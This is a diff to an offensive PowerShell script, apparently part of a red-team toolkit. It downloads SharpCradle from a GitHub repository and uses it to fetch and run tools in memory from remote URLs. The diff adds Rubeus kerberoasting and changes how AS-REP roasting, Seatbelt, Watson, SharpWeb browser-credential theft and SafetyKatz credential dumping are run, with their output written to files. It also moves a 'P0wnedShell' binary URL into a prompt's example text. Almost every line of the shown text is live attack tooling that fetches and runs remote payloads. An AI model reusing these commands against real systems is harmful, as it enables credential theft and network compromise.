@@ -141,9 +141,11 @@ function sharpcradle{
        		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
        		Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to .\LocalRecon\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe all $currentPath\LocalRecon\SeatBeltOutput.txt
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe all >> $currentPath\LocalRecon\SeatBeltOutput.txt
 		Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\'
 		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe asreproast /format:hashcat >> $currentPath\Exploitation\ASreproasting.txt
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe kerberoast /format:hashcat >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
+		Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'
 		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
 		Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
 		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe all >> $currentPath\Exploitation\Browsercredentials.txt
@@ -156,21 +158,18 @@ function sharpcradle{
 			Write-Host -ForegroundColor Yellow 'Safetykatz ftw. Output goes to .\Exploitation\'
 			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SafetyKatz.exe >> $currentPath\Exploitation\SafetyCreds.txt
 		}
-		$P0wnedShell = Read-Host -Prompt 'Open up an P0wnedShell? (yes/no)'
-		if ($P0wnedShell -eq "yes" -or $P0wnedShell -eq "y" -or $P0wnedShell -eq "Yes" -or $P0wnedShell -eq "Y")
-    		{
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe
-		}
-    		del .\cradle.exe
+		del .\cradle.exe
     	    }
     	    else
     	    {
        		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
        		Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to .\LocalRecon\'
-		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe all $currentPath\LocalRecon\SeatBeltOutput.txt
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe all >> $currentPath\LocalRecon\SeatBeltOutput.txt
 		Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\'
 		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe asreproast /format:hashcat >> $currentPath\Exploitation\ASreproasting.txt
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe kerberoast /format:hashcat >> $currentPath\Exploitation\Kerberoasting_Rubeus.txt
+		Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'
 		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
 		Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
 		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe all >> $currentPath\Exploitation\Browsercredentials.txt
@@ -182,11 +181,6 @@ function sharpcradle{
 			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe audit $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt
 			Write-Host -ForegroundColor Yellow 'Safetykatz ftw. Output goes to .\Exploitation\'
 			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SafetyKatz.exe >> $currentPath\Exploitation\SafetyCreds.txt
-		}
-		$P0wnedShell = Read-Host -Prompt 'Open up an P0wnedShell? (yes/no)'
-		if ($P0wnedShell -eq "yes" -or $P0wnedShell -eq "y" -or $P0wnedShell -eq "Yes" -or $P0wnedShell -eq "Y")
-    		{
-			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe
 		}
 		del .\cradle.exe
     	    }
@@ -196,7 +190,7 @@ function sharpcradle{
     {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
-       $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory:'
+       $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe:'
        $arguments = Read-Host -Prompt 'Enter arguments for the executable file:'
         .\cradle.exe -w $url $arguments
 	del .\cradle.exe
@@ -205,7 +199,7 @@ function sharpcradle{
     {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
-       $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory:'
+       $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe:'
        $arguments = Read-Host -Prompt 'Enter arguments for the executable file:'
        .\cradle.exe -w $url $arguments
        del .\cradle.exe
